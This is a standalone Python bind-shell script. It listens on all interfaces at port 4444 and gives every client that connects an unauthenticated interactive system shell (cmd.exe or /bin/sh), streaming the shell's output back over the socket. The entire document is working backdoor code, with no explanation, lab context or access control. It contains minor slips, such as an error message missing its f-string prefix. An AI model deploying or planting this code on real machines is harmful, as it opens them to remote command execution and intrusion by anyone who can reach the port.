import socket
import subprocess
import os
import threading

HOST = '0.0.0.0'
PORT = 4444

def handle_client(conn, addr):
    shell = subprocess.Popen(
        ["cmd.exe" if os.name == "nt" else "/bin/sh"],
        stdin   = subprocess.PIPE,
        stdout  = subprocess.PIPE,
        stderr  = subprocess.PIPE,
        text    = True,
        bufsize = 1
    )
    def pipe_output(stream, connection):
        for line in stream:
            try:
                connection.sendall(line.encode('utf-8'))
            except:
                break
    threading.Thread(target=pipe_output, args=(shell.stdout, conn), daemon=True).start()
    threading.Thread(target=pipe_output, args=(shell.stderr, conn), daemon=True).start()

    try:
        while True:
            data = conn.recv(1024).decode('utf-8')
            if not data or data.strip().lower() == 'exit':
                break
            shell.stdin.write(data)
            shell.stdin.flush()
    except:
        print("Error: {e}")
    finally:
        shell.terminate()
        conn.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)

    try:
        while True:
            conn, addr = server.accept()
            client_thread = threading.Thread(target=handle_client, args=(conn, addr))
            client_thread.start()
    except KeyboardInterrupt:
        print("Quiting . . . ")
    finally:
        server.close()
        
if __name__ == "__main__":
    start_server()
